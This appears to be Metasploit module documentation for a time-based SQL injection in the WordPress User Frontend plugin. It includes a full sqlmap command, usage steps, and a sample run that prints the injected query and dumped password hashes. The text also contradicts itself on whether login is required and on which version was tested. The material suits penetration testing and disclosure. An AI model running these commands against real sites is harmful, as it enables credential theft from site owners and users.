## Vulnerable Application

User Frontend, a WordPress plugin,
prior to 3.5.26 is affected by an authenticated SQL injection via the
`status` parameter.

Remote attackers can exploit this vulnerability to dump usernames and password hashes
from the`wp_users` table of the affected WordPress installation. These password hashes
can then be cracked offline using tools such as Hashcat to obtain valid login
credentials for the affected WordPress installation.

A vulnerable version (3.5.25) of the plugin can be downloaded
[here](https://downloads.wordpress.org/plugin/wp-user-frontend.3.5.25.zip)

The output from running this module will be somewhat similar to the following `sqlmap` command:

```
sqlmap --dbms=mysql -u "http://1.1.1.1/wp-admin/admin.php?page=wpuf_subscribers&status=1*&post_ID=1" --technique T -T wp_users --cookie <cookie> --dump
```

## Verification Steps

1. Install the plugin, use defaults
2. Start msfconsole
3. Do: `use auxiliary/scanner/http/wp_user_frontend_sqli`
4. Do: `set rhosts [ip]`
5. Optionally set `USER_COUNT` to the number of users you want to dump the credentials of.
6. Do: `run`
7. *Verify* that `USER_COUNT` number of users's usernames and password hashes are gathered from the `wp_users` table of the target WordPress installation.

## Options

### ACTION: List Users

This action exploits the unauthenticated SQL injection and lists `USER_COUNT`
users and password hashes from the `wp_users` table of the affected WordPress installation.

### PASSWORD

Password of a wordpress user. Defaults to ''.

### USER_COUNT

If action `List Users` is selected (default), this is the number of users to enumerate the credentials of.
The larger this number, the more time it will take for the module to run.  Defaults to `3`.

### USERNAME

Username of a wordpress user. Defaults to ''.

## Scenarios

### User Frontend 3.5.26 on WordPress 5.7.5 on Ubuntu 20.04
```
resource (userfrontend.rb)> use auxiliary/scanner/http/wp_user_frontend_sqli
resource (userfrontend.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (userfrontend.rb)> set verbose true
verbose => true
resource (userfrontend.rb)> set username admin
username => admin
resource (userfrontend.rb)> set password admin
password => admin
resource (userfrontend.rb)> run
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking /wp-content/plugins/wp-user-frontend/readme.txt
[*] Found version 3.5.25 in the plugin
[+] The target appears to be vulnerable.
[*] Attempting Login
[*] Enumerating Usernames and Password Hashes
[!] Each user will take about 5-10 minutes to enumerate. Be patient.
[*] {SQLi} Executing (select group_concat(rQ) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) rQ from wp_users limit 3) DZAJLImA)
[*] {SQLi} Time-based injection: expecting output of length 124
[+] Dumped table contents:
wp_users
========

 user_login  user_pass
 ----------  ---------
 admin       $P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0
 admin2      $P$BNS2BGBTJmjIgV0nZWxAZtRfq1l19p1
 editor      $P$BdWSGpy/tzJomNCh30a67oJuBEcW0K/

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
